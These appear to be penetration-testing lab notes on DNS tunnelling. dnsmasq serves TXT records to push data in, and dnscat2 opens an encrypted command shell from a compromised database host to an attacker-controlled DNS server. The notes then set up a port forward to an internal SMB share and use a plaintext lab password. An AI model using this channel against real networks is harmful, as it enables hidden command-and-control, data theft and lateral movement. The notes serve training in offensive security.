Infiltrating data to a network through DNS.

Smuggle data in through TXT records from FELINEAUTHORITY using Dnsmasq.

```hlt:1,11,12
kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.
```

Start dnsmasq

```
kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq_txt.conf -d
```

Ensuring this worked by querying txt record for www.feline.corp with #nslookup 

```hlt:1,6,7
database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp
Server:		192.168.50.64
Address:	192.168.50.64#53

Non-authoritative answer:
www.feline.corp	text = "here's something useful!"
www.feline.corp	text = "here's something else less useful."

Authoritative answers can be found from:

database_admin@pgdatabase01:~$
```

### DNS Tunneling with dnscat2

[dnscat2](https://github.com/iagox86/dnscat2)- exfil with DNS subdomain queries. infil with TXT (+ more) records

Starting tcpdump to listen for packets on UDP port 53

```
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
```

Starting the dnscat2 server

```
kali@felineauthority:~$ dnscat2-server feline.corp
```

Result: dnscat2 server is listening on all interfaces on port 53 

```
Starting Dnscat2 DNS server on 0.0.0.0:53
```

Run dnscat2 client binary on PGDATABASE01

```hlt:1,2,14
database_admin@pgdatabase01:~$ cd dnscat/
database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
Creating DNS driver:
 domain = feline.corp
 host   = 0.0.0.0
 port   = 53
 type   = TXT,CNAME,MX
 server = 127.0.0.53

Encrypted session established! For added security, please verify the server also displays this string:

Annoy Mona Spiced Outran Stump Visas 

Session established!
```

Verify connection

```hlt:1
kali@felineauthority:~$ dnscat2-server feline.corp
[sudo] password for kali: 
```

Start interacting with session from dnscat2 server

List active windows 

```hlt:1
dnscat2> windows
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
```

List available commands 

```
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Annoy Mona Spiced Outran Stump Visas
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.

command (pgdatabase01) 1> ?

Here is a list of commands (use -h on any of them for additional help):
* clear
* delay
* download
* echo
* exec
* help
* listen
* ping
* quit
* set
* shell
* shutdown
* suspend
* tunnels
* unset
* upload
* window
* windows
command (pgdatabase01) 1>
```

More info about **listen** because we want to port forward

 ```hlt:1,3,4
command (pgdatabase01) 1> listen --help
Error: The user requested help
Listens on a local port and sends the connection out the other side (like ssh
	-L). Usage: listen [<lhost>:]<lport> <rhost>:<rport>
```

listen operates like SSH -L

Setting up a port forward from FELINEAUTHORITY to PGDATABASE01

```hlt:1
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445
Listening on 127.0.0.1:4455, sending connections to 172.16.2.11:445
command (pgdatabase01) 1> 
```

List the SMB shares through this port forward

```hlt:1,9
kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
